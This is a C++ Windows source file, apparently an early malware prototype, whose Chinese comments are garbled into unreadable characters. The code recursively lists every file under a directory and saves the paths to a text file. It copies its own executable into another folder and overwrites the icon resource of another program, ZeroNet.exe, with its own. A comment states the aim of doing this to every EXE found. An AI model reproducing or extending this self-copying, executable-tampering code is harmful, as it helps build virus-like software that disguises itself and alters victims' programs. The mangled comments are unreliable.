// Encryption.cpp : �������̨Ӧ�ó������ڵ㡣
//

/*
struct _finddata_t
{
unsigned attrib;     //�ļ�����
time_t time_create;  //�ļ�����ʱ��
time_t time_access;  //�ļ���һ�η���ʱ��
time_t time_write;   //�ļ���һ���޸�ʱ��
_fsize_t size;  //�ļ��ֽ���
char name[_MAX_FNAME]; //�ļ���
};
*/


//������ȵݹ������ǰĿ¼���ļ��к��ļ������ļ��к��ļ�
#include "stdafx.h"
#include <fstream>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include<io.h>
#include<Libloaderapi.h>
#include<windows.h>
using namespace std;
void getAllFiles(string path, vector<string>& files)
{
	//�ļ���� 
	long  hFile = 0;
	//�ļ���Ϣ 
	struct _finddata_t fileinfo; //�����õ��ļ���Ϣ��ȡ�ṹ
	string p; //string�������˼��һ����ֵ����:assign()���кܶ����ذ汾
	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
	{
		do
		{
			if ((fileinfo.attrib & _A_SUBDIR)) //�ж��Ƿ�Ϊ�ļ���
			{
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
				{
					files.push_back(p.assign(path).append("/").append(fileinfo.name));//�����ļ�������
					getAllFiles(p.assign(path).append("/").append(fileinfo.name), files);//�ݹ鵱ǰ�ļ���
				}
			}
			else  //�ļ�����
			{
				files.push_back(p.assign(path).append("/").append(fileinfo.name));//�ļ���
			}
		} while (_findnext(hFile, &fileinfo) == 0); //Ѱ����һ�����ɹ�����0������-1
		_findclose(hFile);
	}
}

BOOL ChangeIcon(LPCTSTR pszChangeIconExeFileName)
{
	LPCTSTR a = pszChangeIconExeFileName;
	//��ȡ����ľ��
	HANDLE hLocalHost = GetCurrentProcess();
	if (NULL == hLocalHost)
	{
		cout << "1:"<<GetLastError() << endl;
	}
	HMODULE hLocalHostModule = GetModuleHandleA(NULL);
	if (NULL == hLocalHostModule)
	{
		cout << "2:" << GetLastError() << endl;
	}
	//��α���ת���������
	DuplicateHandle(
		GetCurrentProcess(),   //Դ�����ں˾���������𴫵��ں˶������Ľ��̾��)
		hLocalHost,   //����α��� GetCurrentProcess()
		GetCurrentProcess(),   //Ŀ������ں˾��
		&hLocalHost,    //�����µģ���ʵ�����
		0,                     //TargetHandle���ʹ�ú��ַ������룬��������������ԣ���ΪDUPLICATE_SAME_ACCESS
		FALSE,                 //�µľ�����ɼ̳�
		DUPLICATE_SAME_ACCESS);//�¾��ӵ����ԭʼ�����ͬ�İ�ȫ��������
	////////////////////////////////////////////////////////////////////////////////////////
	//1.���Ϊ�ձ�ʾ��ȡ��ǰ����ģ��
	//2.��Դ����
	//3.��Դ����
	//TOP����Դ�ο�docs.microsoft.com/en-us/windows/desktop/menurc/resource-types
	////////////////////////////////////////////////////////////////////////////////////////
	//�ҵ���Դ����ͼ��
	HRSRC hRsrc = FindResource(hLocalHostModule, (LPCTSTR)1, RT_ICON);
	if (NULL == hRsrc)
	{
		cout << "3:" << GetLastError() << endl;
	}
	DWORD dwSize = SizeofResource(hLocalHostModule,hRsrc);
	if (dwSize<=0)
	{
		cout << "4:" << GetLastError() << endl;
	}
	// ������Դ�������ڴ�
	HGLOBAL hGlobal = LoadResource(hLocalHostModule, hRsrc);
	if (NULL == hGlobal)
	{
		cout << "5:" << GetLastError() << endl;
	}
	// ������Դ�ڴ�
	LPVOID lpVoid = LockResource(hGlobal);
	if (NULL == lpVoid)
	{
		cout << "6:" << GetLastError() << endl;
	}
	//��ȡ���Ա�UPDATERESOURCE�޸ĵľ��
	HANDLE hUpdate = BeginUpdateResource(pszChangeIconExeFileName, FALSE);
	if (NULL == hUpdate)
	{
		cout << "7:" << GetLastError() << endl;
	}
	//����
	//1.��� 2.��Դ���� 3.��ԴID 4.���Ա�ʶ 5.ָ����Դ��ַ 6.��Դ��С
	BOOL bRet =UpdateResource(hUpdate, RT_ICON, (LPCTSTR)1, LANG_NEUTRAL, lpVoid, dwSize);
	if (0 == bRet)
	{
		cout << "8:" << GetLastError() << endl;
	}
	EndUpdateResource(hUpdate, FALSE);
	return 0;
}

void CopyMyself()
{
	
	TCHAR tcBuff[MAX_PATH];//������
    //���Ƶ��ĵ�ַ
	TCHAR tcTarget[38] = _T("F:\\�½��ļ���\\��������\\Encryption.exe");
	GetModuleFileName(NULL, tcBuff, sizeof(tcBuff));//��ȡ�Լ�������
	//copy������������tcBuffת�ɳ��ַ���
	//��һ���������Լ����ֵڶ������Ǹ��ƺ������
	CopyFile(tcBuff, tcTarget, FALSE);
	//cout << &tcBuff << endl;
	
}
//���� 
int main()
{
	//��ȡ�ļ������浽TXT�еĴ����
	string DATA_DIR = "F:/UltraEdit";
	vector<string> files;
	//����
	char * DistAll = "AllFiles.txt";
	getAllFiles(DATA_DIR, files);//�����ļ����ļ��е�·�������
	ofstream ofn(DistAll); //����ļ���
	int size = files.size();
	int FaiNum = 0;
	ofn << size << endl;
	for (int i = 0; i<size; i++)
	{
		ofn << files[i] << endl;
	}
	ofn.close();
	//��������Ĵ����
    CopyMyself();
	//�޸�ͼ��(Ŀǰֻ�޸���һ���ļ������ڱ����ļ����ҳ�EXE�ļ�Ȼ���޸�ͼ��)
	LPCTSTR lpcName = _T("F:\\�½��ļ���\\��������\\ZeroNet.exe");
	ChangeIcon(lpcName);
	getchar();
	return 0;
}
